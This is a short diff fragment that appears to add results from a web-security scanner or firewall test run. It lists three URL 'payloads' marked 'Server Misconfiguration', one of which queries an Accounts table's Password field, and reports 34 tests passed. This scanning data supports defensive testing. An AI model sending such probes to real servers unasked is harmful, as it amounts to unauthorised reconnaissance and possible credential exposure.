+        },
+        "32": {
+          "location": "url",
+          "payload": "/WSsamples/phpThumb.demo.demo.php",
+          "result": "04dd4559-8234-4128-ad1e-fb64e2eb3899",
+          "test": "Server Misconfiguration - URL"
+        },
+        "33": {
+          "location": "url",
+          "payload": "/WSsamples/filter.php?dbtable=Accounts&dbfield=Password",
+          "result": "d0a18070-16f5-4bef-a296-437f928f7b49",
+          "test": "Server Misconfiguration - URL"
+        },
+        "34": {
+          "location": "url",
+          "payload": "/WSsamples/license.php",
+          "result": "a7216a22-6f47-455c-a678-c34ad6823e10",
+          "test": "Server Misconfiguration - URL"
+        }
+      }
+    },
+    "Summary": {
+      "Failed": 0,
+      "Passed": 34
+    }
+  }
+}
